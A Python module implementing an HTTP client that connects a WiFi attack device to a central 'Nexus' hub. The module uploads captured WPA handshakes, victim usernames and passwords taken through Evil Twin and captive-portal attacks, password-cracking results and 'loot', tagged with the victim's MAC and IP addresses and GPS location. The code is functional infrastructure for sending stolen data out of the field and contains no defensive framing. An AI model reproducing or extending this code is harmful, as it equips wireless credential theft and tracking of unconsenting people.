"""
Nexus API Client.
~~~~~~~~~~~~~~~~~

HTTP client for communicating with MoMo-Nexus hub.
"""

from __future__ import annotations

import asyncio
import base64
import logging
from dataclasses import dataclass
from pathlib import Path
from typing import Any

import aiohttp

logger = logging.getLogger(__name__)


@dataclass
class NexusConfig:
    """Nexus connection configuration."""
    
    enabled: bool = False
    url: str = "http://nexus.local:8080"
    api_key: str = ""
    device_id: str = "momo-001"
    
    # Sync settings
    auto_sync_handshakes: bool = True
    auto_sync_credentials: bool = True
    status_interval: int = 300  # seconds
    
    # Retry settings
    retry_count: int = 3
    retry_delay: float = 5.0
    timeout: float = 30.0


class NexusClient:
    """
    HTTP client for MoMo-Nexus API.
    
    Handles authentication, retries, and common operations.
    
    Example:
        >>> client = NexusClient(NexusConfig(
        ...     url="http://nexus.local:8080",
        ...     api_key="your-api-key",
        ...     device_id="momo-001"
        ... ))
        >>> await client.upload_handshake(
        ...     ssid="TargetWiFi",
        ...     bssid="AA:BB:CC:DD:EE:FF",
        ...     channel=6,
        ...     capture_file=Path("handshake.cap")
        ... )
    """
    
    def __init__(self, config: NexusConfig):
        """
        Initialize Nexus client.
        
        Args:
            config: Nexus configuration
        """
        self.config = config
        self._session: aiohttp.ClientSession | None = None
        self._connected = False
    
    # ==================== Connection ====================
    
    async def connect(self) -> bool:
        """
        Connect to Nexus server.
        
        Returns:
            True if connected successfully
        """
        if not self.config.enabled:
            logger.info("Nexus sync disabled")
            return False
        
        try:
            self._session = aiohttp.ClientSession(
                base_url=self.config.url,
                headers={
                    "Authorization": f"Bearer {self.config.api_key}",
                    "X-Device-ID": self.config.device_id,
                },
                timeout=aiohttp.ClientTimeout(total=self.config.timeout),
            )
            
            # Test connection
            async with self._session.get("/api/health") as resp:
                if resp.status == 200:
                    data = await resp.json()
                    logger.info(f"Connected to Nexus v{data.get('version', 'unknown')}")
                    self._connected = True
                    return True
                else:
                    logger.error(f"Nexus health check failed: {resp.status}")
                    return False
                    
        except Exception as e:
            logger.error(f"Failed to connect to Nexus: {e}")
            return False
    
    async def disconnect(self) -> None:
        """Disconnect from Nexus server."""
        if self._session:
            await self._session.close()
            self._session = None
        self._connected = False
    
    @property
    def is_connected(self) -> bool:
        """Check if connected to Nexus."""
        return self._connected
    
    # ==================== Low-Level API ====================
    
    async def _request(
        self,
        method: str,
        path: str,
        data: dict[str, Any] | None = None,
        files: dict[str, Any] | None = None,
    ) -> dict[str, Any] | None:
        """
        Make API request with retry logic.
        
        Args:
            method: HTTP method
            path: API path
            data: JSON data
            files: Multipart files
            
        Returns:
            Response JSON or None on error
        """
        if not self._session:
            logger.error("Not connected to Nexus")
            return None
        
        for attempt in range(self.config.retry_count):
            try:
                if files:
                    # Multipart upload
                    form = aiohttp.FormData()
                    for key, value in (data or {}).items():
                        form.add_field(key, str(value))
                    for key, (filename, content) in files.items():
                        form.add_field(key, content, filename=filename)
                    
                    async with self._session.request(method, path, data=form) as resp:
                        if resp.status in (200, 201):
                            return await resp.json()
                        else:
                            text = await resp.text()
                            logger.warning(f"Nexus request failed: {resp.status} - {text}")
                else:
                    # JSON request
                    async with self._session.request(method, path, json=data) as resp:
                        if resp.status in (200, 201):
                            return await resp.json()
                        else:
                            text = await resp.text()
                            logger.warning(f"Nexus request failed: {resp.status} - {text}")
                
            except TimeoutError:
                logger.warning(f"Nexus request timeout (attempt {attempt + 1})")
            except aiohttp.ClientError as e:
                logger.warning(f"Nexus request error: {e} (attempt {attempt + 1})")
            except Exception as e:
                logger.error(f"Nexus request failed: {e}")
                return None
            
            if attempt < self.config.retry_count - 1:
                await asyncio.sleep(self.config.retry_delay)
        
        return None
    
    # ==================== Handshake API ====================
    
    async def upload_handshake(
        self,
        ssid: str,
        bssid: str,
        channel: int,
        capture_file: Path | None = None,
        capture_data: bytes | None = None,
        capture_type: str = "4way",
        client_mac: str | None = None,
        signal_strength: int | None = None,
        gps: tuple[float, float] | None = None,
    ) -> dict[str, Any] | None:
        """
        Upload captured handshake to Nexus.
        
        Args:
            ssid: Target SSID
            bssid: Target BSSID
            channel: WiFi channel
            capture_file: Path to capture file
            capture_data: Raw capture bytes (alternative to file)
            capture_type: 4way, pmkid, or wpa3
            client_mac: Client MAC for 4-way
            signal_strength: Signal dBm
            gps: (lat, lon) tuple
            
        Returns:
            Response with handshake ID and status
        """
        # Prepare data
        data: dict[str, Any] = {
            "device_id": self.config.device_id,
            "ssid": ssid,
            "bssid": bssid,
            "channel": channel,
            "capture_type": capture_type,
        }
        
        if client_mac:
            data["client_mac"] = client_mac
        if signal_strength:
            data["signal_strength"] = signal_strength
        if gps:
            data["gps"] = list(gps)
        
        # Get capture data
        if capture_file:
            capture_data = capture_file.read_bytes()
        
        if capture_data:
            data["data"] = base64.b64encode(capture_data).decode()
        
        result = await self._request("POST", "/api/sync/handshake", data=data)
        
        if result:
            logger.info(f"Handshake uploaded: {result.get('id')}")
        
        return result
    
    async def upload_handshake_file(
        self,
        ssid: str,
        bssid: str,
        channel: int,
        capture_file: Path,
        capture_type: str = "4way",
    ) -> dict[str, Any] | None:
        """
        Upload handshake as multipart file.
        
        Args:
            ssid: Target SSID
            bssid: Target BSSID
            channel: WiFi channel
            capture_file: Path to capture file
            capture_type: 4way, pmkid, or wpa3
            
        Returns:
            Response with handshake ID
        """
        data = {
            "device_id": self.config.device_id,
            "ssid": ssid,
            "bssid": bssid,
            "channel": channel,
            "capture_type": capture_type,
        }
        
        files = {
            "file": (capture_file.name, capture_file.read_bytes()),
        }
        
        return await self._request("POST", "/api/sync/handshake/file", data=data, files=files)
    
    async def get_handshakes(
        self,
        device_id: str | None = None,
        status: str | None = None,
        limit: int = 100,
    ) -> list[dict[str, Any]]:
        """
        Get synced handshakes.
        
        Args:
            device_id: Filter by device
            status: Filter by status
            limit: Max results
            
        Returns:
            List of handshakes
        """
        params = []
        if device_id:
            params.append(f"device_id={device_id}")
        if status:
            params.append(f"status={status}")
        params.append(f"limit={limit}")
        
        path = f"/api/sync/handshakes?{'&'.join(params)}"
        result = await self._request("GET", path)
        
        return result if isinstance(result, list) else []
    
    # ==================== Credential API ====================
    
    async def upload_credential(
        self,
        ssid: str,
        client_mac: str,
        capture_type: str = "captive",
        username: str | None = None,
        password: str | None = None,
        domain: str | None = None,
        client_ip: str | None = None,
        user_agent: str | None = None,
        gps: tuple[float, float] | None = None,
    ) -> dict[str, Any] | None:
        """
        Upload captured credential from Evil Twin / Captive Portal.
        
        Args:
            ssid: Target/fake SSID
            client_mac: Victim MAC
            capture_type: captive, eap, wpa_enterprise
            username: Captured username
            password: Captured password
            domain: Domain (for enterprise)
            client_ip: Victim IP
            user_agent: Browser user agent
            gps: (lat, lon) tuple
            
        Returns:
            Response with credential ID
        """
        data: dict[str, Any] = {
            "device_id": self.config.device_id,
            "ssid": ssid,
            "client_mac": client_mac,
            "capture_type": capture_type,
        }
        
        if username:
            data["username"] = username
        if password:
            data["password"] = password
        if domain:
            data["domain"] = domain
        if client_ip:
            data["client_ip"] = client_ip
        if user_agent:
            data["user_agent"] = user_agent
        if gps:
            data["gps"] = list(gps)
        
        result = await self._request("POST", "/api/sync/credential", data=data)
        
        if result:
            logger.info(f"Credential uploaded: {result.get('id')}")
        
        return result
    
    # ==================== Crack Result API ====================
    
    async def upload_crack_result(
        self,
        handshake_id: str,
        success: bool,
        password: str | None = None,
        duration_seconds: int | None = None,
        method: str = "john",
        wordlist: str | None = None,
    ) -> dict[str, Any] | None:
        """
        Upload crack result.
        
        Args:
            handshake_id: Original handshake ID from Nexus
            success: Whether crack was successful
            password: Cracked password (if success)
            duration_seconds: Crack duration
            method: john, hashcat, cloud
            wordlist: Wordlist used
            
        Returns:
            Response
        """
        data = {
            "device_id": self.config.device_id,
            "handshake_id": handshake_id,
            "success": success,
            "method": method,
        }
        
        if password:
            data["password"] = password
        if duration_seconds:
            data["duration_seconds"] = duration_seconds
        if wordlist:
            data["wordlist"] = wordlist
        
        return await self._request("POST", "/api/sync/crack-result", data=data)
    
    # ==================== Status API ====================
    
    async def update_status(
        self,
        battery: int | None = None,
        temperature: int | None = None,
        uptime: int | None = None,
        disk_free: int | None = None,
        memory_free: int | None = None,
        aps_seen: int | None = None,
        handshakes_captured: int | None = None,
        clients_seen: int | None = None,
        gps: tuple[float, float] | None = None,
        mode: str | None = None,
        current_target: str | None = None,
    ) -> dict[str, Any] | None:
        """
        Send status update / heartbeat.
        
        Args:
            battery: Battery percentage
            temperature: CPU temp in C
            uptime: Uptime in seconds
            disk_free: Free disk in MB
            memory_free: Free memory in MB
            aps_seen: APs discovered
            handshakes_captured: Total handshakes
            clients_seen: Clients discovered
            gps: (lat, lon) tuple
            mode: Current mode
            current_target: Current target SSID
            
        Returns:
            Response
        """
        data: dict[str, Any] = {
            "device_id": self.config.device_id,
        }
        
        if battery is not None:
            data["battery"] = battery
        if temperature is not None:
            data["temperature"] = temperature
        if uptime is not None:
            data["uptime"] = uptime
        if disk_free is not None:
            data["disk_free"] = disk_free
        if memory_free is not None:
            data["memory_free"] = memory_free
        if aps_seen is not None:
            data["aps_seen"] = aps_seen
        if handshakes_captured is not None:
            data["handshakes_captured"] = handshakes_captured
        if clients_seen is not None:
            data["clients_seen"] = clients_seen
        if gps:
            data["gps"] = list(gps)
        if mode:
            data["mode"] = mode
        if current_target:
            data["current_target"] = current_target
        
        return await self._request("POST", "/api/sync/status", data=data)
    
    # ==================== Loot API ====================
    
    async def upload_loot(
        self,
        name: str,
        loot_type: str = "file",
        text: str | None = None,
        data: bytes | None = None,
        source: str | None = None,
        tags: list[str] | None = None,
        gps: tuple[float, float] | None = None,
    ) -> dict[str, Any] | None:
        """
        Upload generic loot/data.
        
        Args:
            name: Loot name/filename
            loot_type: file, text, binary
            text: Text content
            data: Binary content
            source: Source description
            tags: Tags for categorization
            gps: (lat, lon) tuple
            
        Returns:
            Response with loot ID
        """
        payload: dict[str, Any] = {
            "device_id": self.config.device_id,
            "loot_type": loot_type,
            "name": name,
        }
        
        if text:
            payload["text"] = text
        if data:
            payload["data"] = base64.b64encode(data).decode()
        if source:
            payload["source"] = source
        if tags:
            payload["tags"] = tags
        if gps:
            payload["gps"] = list(gps)
        
        return await self._request("POST", "/api/sync/loot", payload)
    
    # ==================== Context Manager ====================
    
    async def __aenter__(self) -> NexusClient:
        """Async context manager entry."""
        await self.connect()
        return self
    
    async def __aexit__(self, exc_type: Any, exc_val: Any, exc_tb: Any) -> None:
        """Async context manager exit."""
        await self.disconnect()

